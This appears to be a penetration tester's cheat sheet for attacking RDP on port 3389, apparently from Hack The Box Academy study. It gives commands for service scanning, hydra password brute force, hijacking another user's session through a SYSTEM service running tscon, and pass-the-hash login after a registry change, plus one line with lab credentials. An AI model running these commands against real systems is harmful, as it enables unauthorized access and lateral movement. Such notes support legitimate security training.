# 3389 - RDP

## 3389 - RDP

### Service enumeration

#### Scan

```sh
nmap -sV -sC <IP> -p3389 --script rdp*
```

#### Service interaction

```sh
xfreerdp3 /u:<USER> /p:"<PASS>" /v:<IP>
rdesktop -u <USER> -p <PASS> <IP>
xfreerdp3 /u:htb-student /p:'Academy_student_AD!' /v:10.129.3.124 /cert:ignore +dynamic-resolution +clipboard /drive:kali,/home/char0n/testing
```

### Brute force

```sh
hydra -L <USER_LIST> -p '<PASS>' rdp://<IP>
```

### Session hijacking

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges

```sh
# List active desktop sessions => windows shell on target
query user

# Hijack the session => create a service
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGETSESSION__ID> /dest:<OUR_SESSIONAME>"

# Start the service
net start sessionhijack
```

### Lateral movement - PtH

```sh
# Enable PtH for RDP
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Connect with PtH
xfreerdp3 /v:<IP> /u:<USER> /pth:<HASH>
```
